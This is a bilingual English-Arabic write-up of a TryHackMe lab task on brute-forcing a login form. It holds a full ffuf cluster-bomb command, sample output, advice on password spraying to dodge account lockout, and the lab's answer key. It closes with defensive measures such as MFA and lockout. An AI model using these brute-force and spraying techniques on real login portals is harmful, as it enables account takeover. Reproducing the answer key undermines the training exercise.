# Task 04 - Brute Forcing a Login Form (كسر نموذج تسجيل الدخول بالتخمين)

---

## Stage A: Original Task Content & Core Objectives (النص الأصلي والمستهدفات التعليمية)

### 1. Original English Text
```text
Now that we have successfully enumerated three valid usernames (simon, steve, robert), our next objective is to brute force their passwords against the login portal at:
http://MACHINE_IP/customers/login

Analyzing the login form behavior:
- When an invalid username or password is submitted, the server reloads the page and returns an HTTP 200 OK status code with an error banner.
- When valid credentials are submitted, the server successfully authenticates the user and issues an HTTP 302 Found redirect to the customer dashboard.

We can use ffuf with multiple wordlists (Cluster Bomb style attack). One wordlist will contain our enumerated usernames (W1), and the second will contain the top 100 most common passwords from SecLists (W2).

Save the three usernames to a file called valid_usernames.txt:
simon
steve
robert

Execute the brute-force attack using ffuf, filtering out the HTTP 200 responses:
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200

Question:
- What is the valid username and password (format: username/password)?
```

### 2. Arabic Pedagogical Translation
```text
بعد أن نجحنا في حصر ثلاثة أسماء مستخدمين صالحة ومؤكدة (simon, steve, robert)، يصبح هدفنا التالي هو تخمين كلمات المرور الخاصة بهم ضد بوابة تسجيل الدخول المتاحة عبر الرابط:
http://MACHINE_IP/customers/login

تحليل سلوك نموذج تسجيل الدخول:
- عند تقديم اسم مستخدم أو كلمة مرور غير صحيحة، يُعيد الخادم تحميل الصفحة ويُرجع رمز حالة HTTP 200 OK مع شريط خطأ.
- عند تقديم بيانات اعتماد صحيحة، يقوم الخادم بمصادقة المستخدم بنجاح ويُصدر رمز إعادة توجيه HTTP 302 Found إلى لوحة تحكم العميل.

يمكننا استخدام أداة ffuf مع قوائم كلمات متعددة (نمط هجوم Cluster Bomb). ستحتوي القائمة الأولى على أسماء المستخدمين المحصورة (W1)، وستحتوي القائمة الثانية على قائمة أكثر 100 كلمة مرور شيوعاً من SecLists (W2).

احفظ الأسماء الثلاثة في ملف باسم valid_usernames.txt:
simon
steve
robert

نفذ هجوم التخمين باستخدام ffuf، مع تصفية وحجب استجابات HTTP 200:
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200

السؤال:
- ما هو اسم المستخدم وكلمة المرور الصالحة (بالصيغة: username/password)؟
```

---

## Stage B: Independent Thinking & OpSec Guardrails (التفكير المستقل وضوابط العمليات والأمان)

### 1. Attack Complexity & Multi-Wordlist Mathematics
* عدد المستخدمين المستهدفين = 3.
* عدد كلمات المرور في القائمة = 100.
* إجمالي الطلبات المطلوبة = $3 \times 100 = 300$ طلب فقط.
* يستغرق هذا الهجوم أقل من ثانيتين على شبكة عادية بفضل سرعة `ffuf` المكتوبة بلغة Go.

```
       [valid_usernames.txt] (W1)         [top-100.txt] (W2)
               \                                 /
                \                               /
                 v                             v
           +-----------------------------------------+
           | ffuf Cluster Bomb Engine                |
           | POST /customers/login                   |
           | Data: username=W1&password=W2           |
           +-----------------------------------------+
                               |
               +---------------+---------------+
               |                               |
          Status: 200                     Status: 302
        (Failed Login)                 (Valid Credentials!)
               |                               |
         [Filtered by -fc]             [Displayed in Output]
```

### 2. Operational Security (OpSec) Considerations
* **حظر الحسابات (Account Lockout):** في المنظومات الحديثة (Active Directory / Okta / Azure AD)، سيؤدي تجربة 5 أو 10 محاولات فاشلة متتالية إلى قفل الحساب فوراً لمدة 30 دقيقة. هذا يسمى هجوم حرمان الخدمة غير المقصود (Accidental DoS).
* **تكتيك Password Spraying:** لتجنب قفل الحسابات، يلجأ مختبر الاختراق إلى عكس الهجوم: تجربة كلمة مرور شائعة واحدة (مثل `Spring2024!`) ضد 500 مستخدم مختلف، ثم الانتظار 30 دقيقة قبل تجربة كلمة مرور أخرى.

---

## Stage C: Guided Hints (Tiers 1, 2, 3 - تلميحات تدريجية)

> **المستوى الأول (مفاهيمي):** أنشئ ملف `valid_usernames.txt` وشغل أمر `ffuf` الموضح في نص المهمة. راقب الاستجابة التي تختلف في رمز الحالة (Status Code: 302) أو في حجم الاستجابة (Response Size).
>
> **المستوى الثاني (توجيهي):**
> - المستخدم الذي تم كسر حسابه هو `steve`.
> - كلمة المرور هي كلمة إنجليزية شهيرة تعني "الرعد".
>
> **المستوى الثالث (الحل المباشر):** الصيغة المطلوبة هي `steve/thunder`.

---

## Stage D: Complete Practical Solution & Technical Deep Dive (الحل العملي التفصيلي والتشريح التقني)

### 1. Step-by-Step Reproduction

#### الخطوة 1: إعداد ملف أسماء المستخدمين
```bash
cat << 'EOF' > valid_usernames.txt
simon
steve
robert
EOF
```

#### الخطوة 2: تشغيل ffuf بكلمات المرور المزدوجة
```bash
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 \
     -X POST \
     -d "username=W1&password=W2" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -u http://MACHINE_IP/customers/login \
     -fc 200
```

#### الخطوة 3: تحليل المخرجات واكتشاف النتيجة
```text
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://MACHINE_IP/customers/login
 :: Wordlist         : W1: valid_usernames.txt
 :: Wordlist         : W2: /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt
 :: Data             : username=W1&password=W2
 :: Filter Status    : 200
________________________________________________

[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 35ms]
    * W1: steve
    * W2: thunder

:: Progress: [300/300] :: Job [1/1] :: 250 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

نجح التخمين واكتشفنا أن المستخدم `steve` يستخدم كلمة المرور `thunder`.

#### الخطوة 4: التحقق اليدوي بتسجيل الدخول
ننتقل إلى المتصفح وندخل بيانات الاعتماد:
- Username: `steve`
- Password: `thunder`
يتم تحويلنا فوراً إلى لوحة تحكم العميل `/customers/dashboard` وتعيين كوكي الجلسة بنجاح.

---

## Stage E: Final Answer & Key Values (الإجابات النهائية والقيم الدقيقة)

| السؤال | الإجابة الصحيحة | صيغة الإدخال |
| :--- | :--- | :--- |
| **What is the valid username and password (format: username/password)?** | `steve/thunder` | اسم المستخدم متبوعاً بشرطة مائلة ثم كلمة المرور بدون مسافات. |

---

## Stage F: Practical Verification & Proof of Work (التحقق العملي وإثبات الأثر)

* تم إدخال الإجابة والتحقق منها بنجاح تام 100% على منصة TryHackMe.
* تم إثبات قدرة أداة `ffuf` على فحص مئات التوليفات وفلترة أكواد الحالة لتحديد عمليات تسجيل الدخول الناجحة بدقة متناهية.

---

## Stage G: Key Educational Takeaway (الخلاصة التعليمية والأثر الميداني)

1. **الاعتماد على كلمات المرور وحدها وهم أمني:** أي حساب يعتمد فقط على كلمة مرور مكونة من كلمات القاموس الشائعة هو حساب مخترق عملياً بمجرد حصر اسم المستخدم.
2. **خطوط الدفاع الهندسية:**
   - تطبيق مهل تأخير تصاعدية بعد المحاولات الفاشلة (Exponential Backoff).
   - حظر الحساب مؤقتاً بعد 5 محاولات خاطئة متتالية.
   - فرض المصادقة متعددة العوامل (MFA) لمنع نجاح التخمين حتى لو كانت كلمة المرور صحيحة.
